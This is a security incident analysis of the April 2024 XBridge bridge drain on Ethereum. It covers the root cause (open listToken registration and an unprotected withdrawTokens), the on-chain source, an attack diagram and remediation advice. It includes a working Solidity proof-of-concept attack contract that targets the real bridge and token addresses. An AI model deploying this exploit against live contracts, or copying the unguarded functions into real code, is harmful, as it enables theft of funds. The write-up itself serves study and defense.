# XBridge — listToken + withdrawTokens Unauthorized Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | XBridge |
| **Chain** | Ethereum |
| **Loss** | ~$1,600,000 |
| **Attacker** | [0x0cfc28d1](https://etherscan.io/address/0x0cfc28d16d07219249c6d6d6ae24e7132ee4caa7) |
| **Vulnerable Contract** | [XBridge 0x354cca2f](https://etherscan.io/address/0x354cca2f55dde182d36fe34d673430e226a3cb8c) |
| **STC Token** | [0x19Ae49B9](https://etherscan.io/address/0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A) |
| **Root Cause** | `listToken()` allowed the same token address to be registered multiple times under different chain IDs (85936, 95838), enabling an attacker to drain all STC tokens held by the bridge via `withdrawTokens()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/XBridge_exp.sol) |

---

## 1. Vulnerability Overview

XBridge's `listToken()` function did not prevent the same token address from being registered multiple times under different chain IDs. The attacker paid 0.15 ETH to register the STC token under two fictitious chain IDs (85936, 95838), then called `withdrawTokens()` to drain the entire STC balance held by the bridge contract.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: listToken duplicate registration + withdrawTokens insufficient validation
struct TokenInfo {
    address tokenAddress;
    uint256 chainId;
    bool isMintable;
}

mapping(uint256 => TokenInfo) public listedTokens;

// No duplicate registration check, no ownership validation
function listToken(
    TokenInfo memory baseToken,
    TokenInfo memory correspondingToken,
    bool _isMintable
) external payable {
    require(msg.value >= listingFee, "insufficient fee");
    // Same token address can be re-registered under a different chain ID
    listedTokens[baseToken.chainId] = baseToken;
    listedTokens[correspondingToken.chainId] = correspondingToken;
}

// Anyone can withdraw if the token is registered
function withdrawTokens(address token, address receiver, uint256 amount) external {
    // No access control — executes for any registered token
    IERC20(token).transfer(receiver, amount);
}

// ✅ Safe code: token registration validation + withdrawTokens access control
function listToken(...) external payable onlyOwner {
    require(!isListed[baseToken.tokenAddress], "already listed");
    // ...
}

function withdrawTokens(address token, address receiver, uint256 amount) external onlyBridge {
    require(isPendingWithdrawal[token][receiver][amount], "no pending withdrawal");
    // ...
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: XBridge.sol
    function listToken(tokenInfo memory baseToken, tokenInfo memory correspondingToken, bool _isMintable) external payable {  // ❌ vulnerability
        address _baseToken = baseToken.token;
        address _correspondingToken = correspondingToken.token;
        require(_baseToken != address(0), "INVALID_ADDR");
        require(_correspondingToken != address(0), "INVALID_ADDR");
        require(tokenToTokenWithChainId[baseToken.chain][correspondingToken.chain][_baseToken] == address(0) && tokenToTokenWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken] == address(0), "THIS_PAIR_ALREADY_LISTED");

        isMintableWithChainId[baseToken.chain][correspondingToken.chain][_baseToken][_correspondingToken] = _isMintable;
        isMintableWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken][_baseToken] = _isMintable;
        isMintableWithChainId[correspondingToken.chain][baseToken.chain][_baseToken][_correspondingToken] = _isMintable;
        isMintableWithChainId[correspondingToken.chain][baseToken.chain][_correspondingToken][_baseToken] = _isMintable;

        tokenToTokenWithChainId[baseToken.chain][correspondingToken.chain][_baseToken] = _correspondingToken;
        tokenToTokenWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken] = _baseToken;
        tokenToTokenWithChainId[correspondingToken.chain][baseToken.chain][_baseToken] = _correspondingToken;
        tokenToTokenWithChainId[correspondingToken.chain][baseToken.chain][_correspondingToken] = _baseToken;


        if(_isMintable) {
            isWrappedWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken] = true;
            isWrappedWithChainId[correspondingToken.chain][baseToken.chain][_correspondingToken] = true;
            isWrapped[_correspondingToken] = true;

        }

        tokenOwnerWithChainId[baseToken.chain][correspondingToken.chain][_baseToken][_correspondingToken] = msg.sender;
        tokenOwnerWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken][_baseToken] = msg.sender;
        tokenOwnerWithChainId[correspondingToken.chain][baseToken.chain][_baseToken][_correspondingToken] = msg.sender;
        tokenOwnerWithChainId[correspondingToken.chain][baseToken.chain][_correspondingToken][_baseToken] = msg.sender;

        if(_baseToken == _correspondingToken) _tokenOwner[_baseToken] = msg.sender;
        else {
            if(_baseToken.code.length > 0) _tokenOwner[_baseToken] = msg.sender;
            else _tokenOwner[_correspondingToken] = msg.sender;
        }

        if(!excludeFeeFromListing[msg.sender]) transferListingFee(listingFeeCollector, msg.sender, msg.value);

        emit TokenListed(_baseToken, baseToken.chain, _correspondingToken, correspondingToken.chain, _isMintable, msg.sender);

    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] XBridge.listToken(STC@chainId=85936, STC@chainId=95838, false)
  │         └─ msg.value = 0.15 ETH (listing fee)
  │         └─ Same token address registered under two different chain IDs
  │
  ├─→ [2] XBridge.withdrawTokens(STC, attacker, bridgeBalance)
  │         └─ No access control → full STC balance drained from bridge
  │
  ├─→ [3] STC tokens and other assets stolen
  │
  └─→ [4] ~$1.6M (STC, SRLTY, Mazi, etc.) drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IXBridge {
    struct TokenInfo {
        address tokenAddress;
        uint256 chainId;
        bool isMintable;
    }

    function listToken(
        TokenInfo memory baseToken,
        TokenInfo memory correspondingToken,
        bool _isMintable
    ) external payable;

    function withdrawTokens(address token, address receiver, uint256 amount) external;
}

contract AttackContract {
    IXBridge constant bridge = IXBridge(0x354cca2f55dde182d36fe34d673430e226a3cb8c);
    IERC20   constant STC    = IERC20(0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A);

    function testExploit() external payable {
        // [1] Register STC under fictitious chain IDs (0.15 ETH listing fee)
        IXBridge.TokenInfo memory baseToken = IXBridge.TokenInfo({
            tokenAddress: address(STC),
            chainId: 85936,
            isMintable: false
        });
        IXBridge.TokenInfo memory corrToken = IXBridge.TokenInfo({
            tokenAddress: address(STC),
            chainId: 95838,
            isMintable: false
        });
        bridge.listToken{value: 0.15 ether}(baseToken, corrToken, false);

        // [2] Drain entire STC balance from bridge (no access control)
        uint256 stcBal = STC.balanceOf(address(bridge));
        bridge.withdrawTokens(address(STC), address(this), stcBal);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control (token registration + withdrawal) |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (listToken duplicate registration + withdrawTokens unauthorized withdrawal) |
| **DApp Category** | Cross-chain Bridge |
| **Impact** | Full bridge asset drain (~$1.6M) |

## 6. Remediation Recommendations

1. **listToken onlyOwner**: Restrict token registration to bridge administrators only
2. **Duplicate Registration Prevention**: Block re-registration of already-listed token addresses
3. **withdrawTokens Access Control**: Allow withdrawals only based on verified cross-chain messages
4. **Multisig Bridge**: Require multiple validator signatures to execute withdrawals

## 7. Lessons Learned

- In cross-chain bridges, token registration and withdrawal functions are the functions requiring the strongest access controls.
- If `listToken()` is open to anyone, arbitrary registrations can be used to bypass `withdrawTokens()` authorization.
- The $1.6M loss could have been prevented by adding a single `onlyOwner` modifier to both functions.